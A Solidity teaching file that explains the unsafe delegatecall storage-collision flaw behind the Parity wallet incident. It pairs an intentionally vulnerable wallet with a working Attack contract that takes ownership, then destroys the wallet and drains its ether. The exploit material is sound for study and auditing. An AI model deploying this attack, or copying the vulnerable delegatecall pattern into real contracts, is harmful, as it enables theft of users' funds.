// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

//UNSAFE DELEGATECALL + DoS 
// What is the issue?
// delegatecall preserves context (storage, msg.sender, msg.value, msg.data, ...)
// meaning if A calls B, B needs to declare state variables in the same order!!
// whats this mean?
// you can call out to another library (in this case just this simple lib contract) and
// all the while you preserve the call context from YOUR contract, pretty useful, but
// our guys at parity goofed up



contract Lib {                          //-------------B -> single state variable
    uint public someInput; //field 1

    function processInput(uint _num) public {
        someInput = _num;
    }  
}

// for original owner of this wallet, the intended goal was to 
// update this someInput variable using the library


contract UnsafeWallet {                  //-------------A -> three state variable
    address public lib; //field 1
    address public owner; //field 2 
    uint public someInput; //field 3 <-- lib wants to update this, but doesn't do it correctly

    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }
  
    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function deposit() public payable {
        
    }

    function withdraw() onlyOwner public {
        uint bal = getBalance();
        require(bal > 0);
        
        (bool sent, ) = msg.sender.call{value: bal}("");    // transfer of ether happens here
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function processInput(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("processInput(uint256)", _num));
    }

    function kill() onlyOwner public {
        address payable addr = payable(address(owner));
        selfdestruct(addr);
    }
}



//this is a very very very simplified version of what happened with parity multi-sig wallet


contract Attack {
    // Make sure the storage layout is the same as UnsafeWallet
    // This will allow us to correctly update the state variables
    address public lib; //field 1
    address public owner; //field 2
    uint public someNumber; //field 3

    UnsafeWallet public victim; //field 5
    address private attackOwner;

    constructor(UnsafeWallet _victimAddr) {
        victim = UnsafeWallet(_victimAddr);
        attackOwner = msg.sender;
    }

    function attack() public {
        victim.processInput(uint(uint160(address(this))));   // using attack contract address casted to uint as the parameter for processInput
                                                             // we set lib address to attack contract, and then we call our own processInput
        victim.processInput(100);                           // victim will delegate the call to our attacker, meaning owner = sender
    }

    function dos() public{
        victim.kill();
    }

    // function signature must match lib function
    function processInput(uint _num) public {
        owner = msg.sender;
    }

    function lastStep() public {
        address payable addr = payable(address(attackOwner));
        selfdestruct(addr);
    }
}